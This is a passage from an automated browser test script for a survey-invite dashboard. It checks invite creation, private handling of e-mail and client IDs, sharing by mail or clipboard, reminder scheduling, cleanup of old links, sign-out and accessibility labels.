  check('F create: exactly one new invite with a 32-character key', newKeys.length === 1 && /^[A-Za-z0-9]{32}$/.test(newKeys[0]), JSON.stringify(newKeys));
  const NK = newKeys[0], NI = S['surveyInvites/' + NK], NP = S['surveyInvitesPrivate/' + NK];
  check('F create: invite holds only the public-safe fields (no e-mail, no Client ID), status sent, expiry about 60 days', NI && JSON.stringify(Object.keys(NI).sort()) === JSON.stringify(['company', 'createdAt', 'employerName', 'expiresAt', 'ownerName', 'status', 'surveyVersion']) && NI.status === 'sent' && NI.surveyVersion === 'default-1' && Math.abs((new Date(NI.expiresAt).getTime() - Date.now()) / 864e5 - 60) < 0.1, JSON.stringify(NI));
  check('F create: e-mail and Client ID are in the PRIVATE record only', NP && NP.employerEmail === 'nina+vip@acme.com' && NP.clientId === 'CL-0001' && !JSON.stringify(NI).includes('acme.com') && !JSON.stringify(NI).includes('CL-0001'));
  check('F create: the owner name is remembered for next time; form fields are cleared', S['ownerPrivate/surveySettings'] && S['ownerPrivate/surveySettings'].ownerName === 'Frederick Espinosa' && (await pg.inputValue('#svEmpName')) === '' && (await pg.inputValue('#svEmpEmail')) === '');
  const link = await pg.inputValue('#svOut .svlink');
  check('F create: the link is survey.html#k=KEY (key after #, never in a query)', link === base + 'survey.html#k=' + NK && !link.includes('?'), link);
  await pg.evaluate(() => { window.__opened = []; window.open = (u, t, f) => { window.__opened.push([u, t, f]); return null; }; });
  await pg.click('#svOut button[aria-label^="Send e-mail"]'); await dlg('^Mail program'); const mail = await pg.evaluate(() => window.__mail);
  const dm = decodeURIComponent(mail || '');
  check('F "Mail program" choice opens it with the address, the link and the owner name', /^mailto:nina%2Bvip@acme\.com\?subject=/.test(mail) && dm.includes(link) && dm.includes('Frederick Espinosa') && dm.includes('60 days'), mail);
  await pg.click('#svOut button[aria-label^="Send e-mail"]'); await dlg('^Gmail');
  await pg.click('#svOut button[aria-label^="Send e-mail"]'); await dlg('^Outlook');
  const op = await pg.evaluate(() => window.__opened);
  check('F chooser: Gmail and Outlook open https compose pages in a new tab (noopener) with the address and link', op.length === 2 && op[0][0].startsWith('https://mail.google.com/mail/?view=cm') && op[1][0].startsWith('https://outlook.live.com/mail/0/deeplink/compose?') && op.every(o => o[1] === '_blank' && /noopener/.test(o[2]) && decodeURIComponent(o[0]).includes(link) && o[0].includes('nina%2Bvip%40acme.com')), JSON.stringify(op).slice(0, 200));
  await pg.click('#svOut button[aria-label^="Send e-mail"]'); await dlg('^Copy message'); check('F chooser: Copy message copies subject and body with the link', (await pg.evaluate(() => navigator.clipboard.readText())).includes(link));
  await pg.evaluate(() => { const d = document.querySelector('dialog[open]'); if (d) d.close(); });
  await pg.click('#svOut button[aria-label^="Copy link"]'); check('F "Copy link" puts the link on the clipboard', (await pg.evaluate(() => navigator.clipboard.readText())) === link);
  await pg.click('#svOut button[aria-label^="Copy message"]'); check('F "Copy message" copies subject and body with the link', (await pg.evaluate(() => navigator.clipboard.readText())).includes(link));
  check('F the new invite is listed as waiting and its row can send again', await pg.evaluate(() => [...document.querySelectorAll('#svInvList .cidrow')].some(r => r.textContent.includes('New Nina') && r.textContent.includes('CL-0001') && r.querySelector('button[aria-label^="Send e-mail"]'))));
  check('F rows are one line: no e-mail text under the name, actions on the right', await pg.evaluate(() => [...document.querySelectorAll('#svInvList .cidrow')].every(r => r.classList.contains('svrow') && !/@/.test(r.textContent) && r.querySelector('.svact') === r.lastElementChild)));
  await pg.click('#svOut button[aria-label^="Hide"]'); check('F "Hide" closes the link panel', await pg.evaluate(() => document.getElementById('svOut').hidden));
  // ---------------- SV2a: reminders, cleanup
  const today = await pg.evaluate(() => window.coreSurvey.todayManila(Date.now()));
  await pg.evaluate(() => {
    const S = window.__store, SV = window.coreSurvey, ts = ms => ({ toDate: () => new Date(ms), toMillis: () => ms }), now = Date.now(), t = SV.todayManila(now), D = 864e5;
    const reg = id => { S['clientRegistry/' + id] = { status: 'active', notes: '', createdAt: ts(now), updatedAt: ts(now), rev: 1, lastAudit: 'a' }; };
    ['CL-0003', 'CL-0004'].forEach(reg);
    S['surveyReminders/CL-0001'] = { startDate: SV.addMonths(t, -4), months: 3, status: 'active', snoozedUntil: '', updatedAt: ts(now) };
    S['surveyReminders/CL-0003'] = { startDate: t, months: 3, status: 'active', snoozedUntil: '', updatedAt: ts(now) };
    S['surveyReminders/CL-0004'] = { startDate: SV.addMonths(t, -9), months: 3, status: 'skipped', snoozedUntil: '', updatedAt: ts(now) };
    const mkI = (key, st, ago, extra) => { S['surveyInvites/' + key] = Object.assign({ surveyVersion: 'default-1', employerName: 'Old ' + key.slice(0, 3), company: '', ownerName: 'F', status: st, createdAt: ts(now - (ago + 60) * D), expiresAt: ts(now - ago * D) }, extra || {}); S['surveyInvitesPrivate/' + key] = { employerEmail: 'old@x.com', clientId: '' }; };
    mkI('OldAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(0, 32), 'sent', 40); mkI('OldBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'.slice(0, 32), 'revoked', 45);
    mkI('OldCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'.slice(0, 32), 'submitted', 100, { submittedAt: ts(now - 120 * D) }); S['surveyResponses/' + 'OldCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'.slice(0, 32)] = { rating: 4, comment: 'Kept forever until the owner deletes it.', best: '', recommend: 'yes', videoUrl: '', displayName: 'Old C', displayRole: '', displayCompany: '', consentPublish: true, submittedAt: ts(now - 120 * D), ownerStatus: 'rejected', decidedAt: ts(now - 110 * D) };
    mkI('OldDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'.slice(0, 32), 'sent', 10);
  });
  await pg.click('#svRefresh'); await pg.waitForTimeout(500);
  const rowsOf = sel => pg.$$eval(sel + ' .cidrow', rs => rs.map(r => ({ t: (r.querySelector('strong') || {}).textContent, btns: [...r.querySelectorAll('button')].map(x => x.getAttribute('aria-label')), txt: r.textContent })));
  let due = await rowsOf('#svDueList'), allR = await rowsOf('#svRemList');
  check('F2 due card lists only the reminder that is due, with Create / Snooze / Not needed', due.length === 1 && due[0].t === 'CL-0001' && JSON.stringify(due[0].btns) === JSON.stringify(['Create survey link: CL-0001', 'Snooze 7 days: CL-0001', 'Not needed: CL-0001']), JSON.stringify(due));
  check('F2 all reminders listed with their state (due now / waiting / not needed)', allR.length === 3 && /due now/.test(allR[0].txt) && /waiting/.test(allR[1].txt) && /not needed/.test(allR[2].txt), JSON.stringify(allR.map(r => r.txt)));
  check('F2 menu badge counts pending answers plus due reminders', await pg.evaluate(() => { const pend = Object.entries(window.__store).filter(([k, v]) => k.startsWith('surveyResponses/') && v.ownerStatus === 'pending').length; return document.getElementById('surveyBadge').textContent === String(pend + 1); }));
  await pg.fill('#svRemMonths', '0'); await pg.selectOption('#svRemClient', 'CL-0003'); await pg.fill('#svRemStart', '2026-08-31'); await pg.click('#svRemSave'); await pg.waitForTimeout(200);
  const e1 = await pg.textContent('#svRemErr'); const unchanged = await pg.evaluate(() => window.__store['surveyReminders/CL-0003'].startDate);
  check('F2 months 0 is refused with a message and nothing is saved', /Months/.test(e1) && unchanged === today, e1);
  await pg.fill('#svRemStart', ''); await pg.fill('#svRemMonths', '6'); await pg.click('#svRemSave'); await pg.waitForTimeout(200);
  check('F2 a missing start date is refused', /start work date/i.test(await pg.textContent('#svRemErr')));
  await pg.fill('#svRemStart', '2026-08-31'); await pg.click('#svRemSave'); await pg.waitForTimeout(400);
  const sv = await pg.evaluate(() => window.__store['surveyReminders/CL-0003']);
  check('F2 saving writes startDate, months, active, empty snooze; the list shows the month-end due date', sv.startDate === '2026-08-31' && sv.months === 6 && sv.status === 'active' && sv.snoozedUntil === '' && Object.keys(sv).sort().join() === 'months,snoozedUntil,startDate,status,updatedAt' && /due 2027-02-28/.test(await pg.textContent('#svRemList')), JSON.stringify(sv));
  await pg.click('#svDueList button[aria-label^="Snooze 7 days"]'); await pg.waitForTimeout(400);
  const sn = await pg.evaluate(() => window.__store['surveyReminders/CL-0001']);
  check('F2 Snooze 7 days sets the snooze date and the reminder leaves the due card', sn.snoozedUntil === (new Date(Date.parse(today + 'T00:00:00Z') + 7 * 864e5).toISOString().slice(0, 10)) && sn.status === 'active' && (await rowsOf('#svDueList')).length === 0 && /No survey is due/.test(await pg.textContent('#svDueList')), JSON.stringify(sn));
  await pg.evaluate(() => { window.__store['surveyReminders/CL-0001'].snoozedUntil = ''; }); await pg.click('#svRefresh'); await pg.waitForTimeout(400);
  await pg.click('#svDueList button[aria-label^="Create survey link"]'); await pg.waitForTimeout(200);
  check('F2 "Create survey link" selects that Client ID and moves to the employer name', await pg.evaluate(() => document.getElementById('svClient').value === 'CL-0001' && document.activeElement.id === 'svEmpName'));
  await pg.click('#svDueList button[aria-label^="Not needed"]'); await pg.waitForTimeout(400);
  check('F2 "Not needed" marks the reminder skipped', (await pg.evaluate(() => window.__store['surveyReminders/CL-0001'].status)) === 'skipped' && (await rowsOf('#svDueList')).length === 0);
  await pg.selectOption('#svClient', 'CL-0003'); await pg.fill('#svEmpName', 'Remy Reyes'); await pg.fill('#svEmpEmail', 'remy@acme.com'); await pg.click('#svCreate'); await pg.waitForTimeout(600);
  check('F2 creating a link for that Client ID marks its reminder as done (survey sent)', (await pg.evaluate(() => window.__store['surveyReminders/CL-0003'].status)) === 'done' && /survey sent/.test(await pg.textContent('#svRemList')));
  await pg.click('#svOut button[aria-label^="Hide"]');
  await pg.click('#svRemList .cidrow:has(strong:text-is("CL-0004")) button[aria-label^="Delete reminder"]'); await dlg('delete reminder');
  check('F2 deleting a reminder asks first and removes only that reminder', !(await pg.evaluate(() => 'surveyReminders/CL-0004' in window.__store)) && (await pg.evaluate(() => 'surveyReminders/CL-0003' in window.__store)));
  check('F2 cleanup offers exactly the two old unanswered links (not the answered one, not the recent expired ones)', /^2 old links can be removed/.test(await pg.textContent('#svCleanState')) && !(await pg.$eval('#svCleanBtn', b => b.disabled)));
  await pg.click('#svCleanBtn'); const ct = await pg.evaluate(() => document.querySelector('dialog[open]').textContent.replace(/\s+/g, ' ')); await dlg('^\\s*cancel');
  check('F2 cleanup asks first and says answers are never removed; cancel changes nothing', /never removed/.test(ct) && (await pg.evaluate(() => Object.keys(window.__store).filter(k => k.startsWith('surveyInvites/Old')).length)) === 4);
  await pg.click('#svCleanBtn'); await dlg('remove old links'); await pg.waitForTimeout(400);
  const left = await pg.evaluate(() => Object.keys(window.__store).filter(k => /^(surveyInvites|surveyInvitesPrivate|surveyResponses)\/Old/.test(k)).sort());
  check('F2 cleanup deleted the two old invites and their private records; the answered invite, its answer and the recent invite remain', left.join() === ['surveyInvites/', 'surveyInvites/', 'surveyInvitesPrivate/', 'surveyInvitesPrivate/', 'surveyResponses/'].map((p, i) => p + ('Old' + (i % 2 === 0 || p === 'surveyResponses/' ? 'C' : 'D').repeat(32)).slice(0, 32)).join() && (await pg.$eval('#svCleanBtn', b => b.disabled)), left.join());
  check('F2 reminder rows hold no e-mail or name, and every new control has an accessible name', await pg.evaluate(() => !/@/.test(document.getElementById('svRemList').textContent + document.getElementById('svDueList').textContent) && [...document.querySelectorAll('#dp-surveys button, #dp-surveys input, #dp-surveys select')].filter(x => !x.hidden && x.type !== 'hidden').every(x => (x.getAttribute('aria-label') || '').trim() || (x.labels && x.labels.length) || (x.textContent || '').trim())));
  // sign out clears everything
  await signOut(pg); await pg.waitForTimeout(200);
  check('F signing out clears the lists and the link panel', await pg.evaluate(() => document.querySelectorAll('#svInvList .cidrow, #svRespList .cidrow').length === 0 && document.getElementById('svOut').hidden && document.getElementById('surveyBadge').hidden));
  // accessibility: every control on the page has a name
  await signIn(pg); await pg.evaluate(() => { const d = document.getElementById('dash'); if (d) d.hidden = false; }); await pg.evaluate(() => document.querySelector('.dnav [data-page=surveys]').click()); await pg.waitForTimeout(500);
  const unnamed = await pg.$$eval('#dp-surveys button, #dp-surveys input, #dp-surveys select', bs => bs.filter(x => !x.hidden && x.offsetParent && !(x.getAttribute('aria-label') || x.textContent.trim() || x.getAttribute('title') || (x.labels && x.labels.length))).length);
  check('F every control on the surveys page has an accessible name', unnamed === 0, unnamed);
  const touch = await pg.$$eval('#dp-surveys .ibtn', bs => bs.filter(x => x.offsetParent).length);
  check('F row actions are icon buttons (T2 style)', touch > 0);
  await ctx.close();
}
check('page errors: ' + JSON.stringify(errs), errs.length === 0);
const bad = results.filter(r => !r[1]).length; console.log(bad ? 'SOME FAILED (' + bad + ')' : 'ALL PASSED (' + results.length + ')');
await b.close(); srv.close();
